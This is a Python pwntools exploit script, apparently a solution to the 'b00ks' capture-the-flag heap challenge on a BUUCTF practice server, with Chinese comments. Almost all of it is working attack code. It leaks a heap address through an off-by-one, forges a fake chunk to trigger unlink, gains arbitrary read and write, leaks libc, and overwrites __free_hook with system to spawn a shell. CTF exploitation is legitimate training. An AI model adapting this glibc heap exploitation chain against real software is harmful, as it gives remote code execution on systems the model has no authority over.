#coding:utf-8
import sys
import os
import os.path
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
# p = process("./b00ks")
p=remote('node3.buuoj.cn',25132)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def cmd(choice):
    p.recvuntil('> ')
    p.sendline(str(choice))
def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(': ')
    p.sendline(str(book_size))
    p.recvuntil(': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(': ')
    p.sendline(str(desc_size))
    p.recvuntil(': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)
def remove(idx):
    cmd(2)
    p.recvuntil(': ')
    p.sendline(str(idx))
def edit(idx, desc):
    cmd(3)
    p.recvuntil(': ')
    p.sendline(str(idx))
    p.recvuntil(': ')
    p.send(desc)
def author_name(author):
    cmd(5)
    p.recvuntil(': ')
    p.send(author)
def main():
    # pwnlib.gdb.attach(p,"")
    p.recvuntil('name: ')
    p.sendline('x' * (0x20 - 5) + 'leak:')
    raw_input("0")
    create(0x20, 'tmp a', 0x20, 'b') # book1
    raw_input("1")
    cmd(4)
    p.recvuntil('Author: ')
    p.recvuntil('leak:')
    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    p.info('heap leak @ 0x%x' % heap_leak)
    heap_base = heap_leak - 0x1080  # 泄露book1地址，并计算heap的基址
    create(0x20, 'buf 1', 0x20, 'desc buf')  # book2
    raw_input("2")
    create(0x20, 'buf 2', 0x20, 'desc buf 2') # book3
    raw_input("3")
    remove(2)
    remove(3)
    raw_input("desc chunk") # 创建两个book然后释放，利用fast bins的特性，对chunk进行排序。
    
    ptr = heap_base + 0x1180 # 计算指向fake chunk的指针地址
    payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + '\x00' * 0xe0 + p64(0x100) #fake chunk payload
    
    create(0x20, 'name', 0x108, 'overflow') # book4  book4 des用于创建fake chunk并向book5 des off by one溢出一字节
    create(0x20, 'name', 0x100 - 0x10, 'target') # book5 book5 des用于被溢出并修改P位的chunk
    create(0x20, '/bin/sh\x00', 0x200, 'to arbitrary read write') # book6 用于getshell
    
    edit(4, payload) # 溢出
    
    remove(5) # unlink  触发向后合并 book_description_ptr == &book_description_ptr - 0x18
    edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + '\n') # 修改book4的book4 des指向book6的book_description_ptr，可以利用book6任意读写
    def write_to(addr, content, size):
        edit(4, p64(addr) + p64(size + 0x100) + '\n')
        edit(6, content + '\n')
    def read_at(addr):
        edit(4, p64(addr) + '\n')
        cmd(4)
        p.recvuntil('Description: ')
        p.recvuntil('Description: ')
        p.recvuntil('Description: ')
        content = p.recvline()[:-1]
        p.info(content)
        return content
    libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, '\x00')) -  0x3c4b78
    #堆中读取main_arena+88地址，根据偏移计算libc基地址
    p.info('libc leak @ 0x%x' % libc_leak)
    write_to(libc_leak + libc.symbols['__free_hook'], p64(libc_leak + libc.symbols['system']), 0x10) #利用__free_hook使system覆盖free
    remove(6) #getshell
    p.interactive()
if __name__ == '__main__':
    main()